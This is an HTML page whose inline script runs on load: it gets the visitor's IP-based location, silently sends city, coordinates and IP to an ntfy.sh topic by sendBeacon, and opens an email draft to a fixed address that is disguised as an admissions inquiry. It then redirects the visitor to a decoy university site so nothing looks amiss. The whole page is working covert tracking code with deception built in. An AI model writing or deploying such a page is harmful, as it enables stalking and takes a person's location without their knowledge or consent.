<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: sans-serif;
            flex-direction: column;
            gap: 8px;
        }
        .dot {
            width: 10px; height: 10px; border-radius: 50%;
            background: #d0d0d0;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.2); }
        }
        .status {
            font-size: 0.7rem; color: #a0a0a0; display: none;
            text-align: center; max-width: 200px;
        }
    </style>
</head>
<body>
    <div class="dot" id="dot"></div>
    <div class="status" id="status"></div>

    <script>
        (function() {
            // ============================================================
            //  CONFIGURATION – EDIT THESE VALUES (keep them secret)
            // ============================================================
            const PARENT_EMAIL = 'baraiayush366@Gmail.com';      // Your parents' email address
            const NTFY_TOPIC   = 'Location_Notify';   // Long random string (e.g., 'fam7xq2k9m')
            const DECOY_URL    = 'https://www.iitb.ac.in/';   // Innocent page to show after sending
            // ============================================================

            const statusEl = document.getElementById('status');
            const dotEl = document.getElementById('dot');

            function showStatus(text, color = '#a0a0a0') {
                statusEl.textContent = text;
                statusEl.style.color = color;
                statusEl.style.display = 'block';
                if (dotEl) dotEl.style.display = 'none';
            }

            // -----------------------------------------------------------------
            // IP Geolocation – no permission needed
            // -----------------------------------------------------------------
            async function getIpLocation() {
                // Free API (1000 requests/day, no key required)
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error('IP location failed');
                const data = await response.json();
                return {
                    lat: data.latitude,
                    lng: data.longitude,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    ip: data.ip
                };
            }

            // -----------------------------------------------------------------
            // Build innocent email + map link
            // -----------------------------------------------------------------
            function buildDisguisedEmail(loc) {
                const mapsUrl = `https://maps.google.com/?q=${loc.lat},${loc.lng}`;
                const time = new Date().toLocaleString();
                // Innocent subject and body – looks like an admission inquiry
                const subject = 'Inquiry about admission process';
                const body =
                    `Dear Admissions Office,\n\n` +
                    `I am writing to express my interest in the upcoming academic session. ` +
                    `Could you please provide more details about the admission requirements and deadlines?\n\n` +
                    `For your reference, here is my current location (as requested for eligibility purposes):\n` +
                    `${mapsUrl}\n\n` +
                    `Thank you for your time.\n` +
                    `Regards,\n` +
                    `A Prospective Student`;

                return { subject, body, mapsUrl };
            }

            // -----------------------------------------------------------------
            // Silent ntfy via sendBeacon
            // -----------------------------------------------------------------
            function sendNtfyBeacon(loc) {
                if (!NTFY_TOPIC || NTFY_TOPIC === 'your_secret_topic_here') return;
                const msg =
                    `📍 Location alert\n` +
                    `City: ${loc.city}, ${loc.region}, ${loc.country}\n` +
                    `Lat: ${loc.lat}, Lng: ${loc.lng}\n` +
                    `IP: ${loc.ip}\n` +
                    `Time: ${new Date().toLocaleString()}\n` +
                    `Map: https://maps.google.com/?q=${loc.lat},${loc.lng}`;
                const blob = new Blob([msg], { type: 'text/plain' });
                navigator.sendBeacon(`https://ntfy.sh/${NTFY_TOPIC}`, blob);
            }

            // -----------------------------------------------------------------
            // Open email client with disguised draft
            // -----------------------------------------------------------------
            function openEmailClient(loc) {
                const { subject, body } = buildDisguisedEmail(loc);
                const mailto = `mailto:${PARENT_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
                window.location.href = mailto;
            }

            // -----------------------------------------------------------------
            // Redirect to decoy
            // -----------------------------------------------------------------
            function redirectToDecoy() {
                setTimeout(() => {
                    if (DECOY_URL) window.location.replace(DECOY_URL);
                }, 800);
            }

            // -----------------------------------------------------------------
            // Main flow – runs instantly on page load
            // -----------------------------------------------------------------
            async function main() {
                try {
                    const loc = await getIpLocation();
                    // Send ntfy silently
                    sendNtfyBeacon(loc);
                    // Open email with disguised message
                    openEmailClient(loc);
                    // Redirect browser to decoy
                    redirectToDecoy();
                } catch (error) {
                    showStatus('network error', '#c0392b');
                    // Still redirect after a moment
                    setTimeout(() => {
                        if (DECOY_URL) window.location.replace(DECOY_URL);
                    }, 2000);
                }
            }

            main();
        })();
    </script>
</body>
</html>
